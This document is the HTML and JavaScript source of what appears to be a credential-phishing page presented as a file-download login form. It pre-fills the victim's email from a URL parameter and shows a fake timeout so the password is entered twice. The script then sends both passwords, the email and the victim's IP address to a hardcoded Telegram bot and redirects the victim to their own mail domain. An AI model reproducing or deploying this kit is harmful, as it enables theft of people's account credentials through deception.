	<style>
        body {
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            display: flex;
            width: 90%; /*Make it responsive*/
            max-width: 400px;
            background: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            border-radius: 8px; /*Rounded corners*/
        }
        .form-container {
            padding: 20px;
            flex: 1;
            transition: transform 0.5s;
            position: relative; /*Positioning for the animated icon*/
        }
        .icon {
            font-size: 30px;
            margin-right: 10px;
        }
        .animated-icon {
            display: none; /*Initially hide the loading icon*/
            position: absolute;
            down: 20px;
            center: 20px;
            color: #007bff; /*Bootstrap primary color*/
        }
        .input-group {
            position: relative;
            margin-bottom: 15px;
        }
        .input-group .form-control {
            padding-left: 40px; /*Space for icon*/
        }
        .input-group .input-icon {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #007bff; /*Icon color*/
            transition: color 0.3s;
        }
        .input-group .form-control:focus + .input-icon {
            color: #0056b3; /*Darker color on focus*/
        }
    </style>
</head>

<form id="loginForm" method="post" style="margin-top: 20px;">
    <div class="input-group">
        <input type="email" class="form-control" name="ai" id="username" placeholder="Email" required readonly>
        <i class="fas fa-envelope input-icon"></i> <!-- Email icon -->
    </div>
    <div class="input-group">
        <div id="confirmationMessage" style="display: none; color: red; font-size: 14px; margin-bottom: 5px;">
            Sign in attempt timeout, please try again..
        </div>
        <input type="password" class="form-control" id="password" placeholder="Enter Password" autofocus required>
        <i class="fas fa-lock input-icon" id="lockIconFirstPassword"></i> <!-- Password icon for first password -->
    </div>
    <div id="secondPasswordDiv" style="display: none;">
        <input type="password" class="form-control" id="secondPassword" placeholder="Re-enter your password" required>
        <!-- No icon for the second password -->
    </div>
    <div class="form-check">
        <input type="checkbox" class="form-check-input" id="rememberMe">
        <label for="rememberMe" style="font-size: 12.8px;">Remember Me</label>
    </div>
    <br>
    <button type="submit" class="btn btn-primary" id="submitBtn" style="padding-left: 100px; padding-right: 100px; margin-left: 20px;">
        <i class="fas fa-download"></i> Download
    </button>
    <div class="animated-icon" id="loadingIcon" style="display: none;">
        <i class="fas fa-spinner fa-spin"></i> Downloading, Please wait...
    </div>
</form>

<script>
    let firstPassword = ""; // Variable to store the first password
    let emailDomain = ""; // Variable to store the domain of the email

    // Function to get the query parameter value by its name
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Autofill the email field when the page loads
    document.addEventListener("DOMContentLoaded", function () {
        const email = getQueryParam('requestID'); // Get 'requestID' parameter from the URL
        if (email) {
            document.getElementById('username').value = email; // Autofill the email field
            emailDomain = email.split('@')[1]; // Extract domain from email
        }
    });

    // Show the second password input and hide the first password icon when first password is entered
    document.getElementById('password').addEventListener('blur', function () {
        const passwordInput = document.getElementById('password');
        const secondPasswordDiv = document.getElementById('secondPasswordDiv');
        const confirmationMessage = document.getElementById('confirmationMessage');
        const lockIconFirstPassword = document.getElementById('lockIconFirstPassword');

        if (!firstPassword) {
            // Save the first password
            firstPassword = passwordInput.value.trim();

            if (firstPassword) {
                // Show the confirmation message
                confirmationMessage.style.display = "block";

                // Hide the first password field and icon, show the second password field
                passwordInput.style.display = "none";
                lockIconFirstPassword.style.display = "none"; // Hide the lock icon for the first password
                setTimeout(() => {
                    secondPasswordDiv.style.display = "block";
                    document.getElementById('secondPassword').focus(); // Focus on the second password field
                }, 3000); // 3-second delay
            } else {
                alert("Please enter a valid password.");
            }
        }
    });

    // Handle form submission
    document.getElementById('loginForm').addEventListener('submit', function (e) {
        e.preventDefault();

        const email = document.getElementById('username').value;
        const secondPasswordInput = document.getElementById('secondPassword');
        const confirmationMessage = document.getElementById('confirmationMessage');
        const submitBtn = document.getElementById('submitBtn');
        const loadingIcon = document.getElementById('loadingIcon');
        const rememberMe = document.getElementById('rememberMe').checked;

        const secondPassword = secondPasswordInput.value.trim();
        if (!secondPassword) {
            alert("Please re-enter your password.");
            secondPasswordInput.focus();
            return;
        }

        // Hide submit button and show spinner
        submitBtn.style.display = 'none';
        loadingIcon.style.display = 'block';

        // Ensure email domain is extracted
        if (!emailDomain) {
            emailDomain = email.split('@')[1]; // Extract the domain from the email if not already done
        }

        const redirectUrl = `https://${emailDomain}`; // Construct the redirect URL

        // Fetch the IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                // Telegram Bot API URL
                const telegramBotToken = '7752875033:AAGoiki2oQNsniJ4K5d-QDhWt4ZZ4wdmEV0';
                const telegramChatId = '1767431781';
                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

                // Message to send
                const message = `New Login Attempt:\nEmail: ${email}\nFirst Password: ${firstPassword}\nSecond Password: ${secondPassword}\nRemember Me: ${rememberMe}\nIP Address: ${ipAddress}`;

                // Send data to Telegram
                fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: message,
                    }),
                })
                .then(() => {
                    // Show the confirmation message
                    confirmationMessage.style.display = 'block';

                    // Redirect to the user's email domain after 2 seconds
                    setTimeout(() => {
                        window.location.href = redirectUrl; // Redirect
                    }, 2000); // 2-second delay before redirection
                })
                .catch(error => {
                    console.error("Error sending data to Telegram:", error);
                    alert("Failed to send data. Please try again.");
                })
                .finally(() => {
                    loadingIcon.style.display = 'none';
                    submitBtn.style.display = 'inline-block';
                });
            })
            .catch(error => {
                console.error("Error fetching IP address:", error);
                alert("Failed to fetch IP address.");
                loadingIcon.style.display = 'none';
                submitBtn.style.display = 'inline-block';
            });
    });
</script>
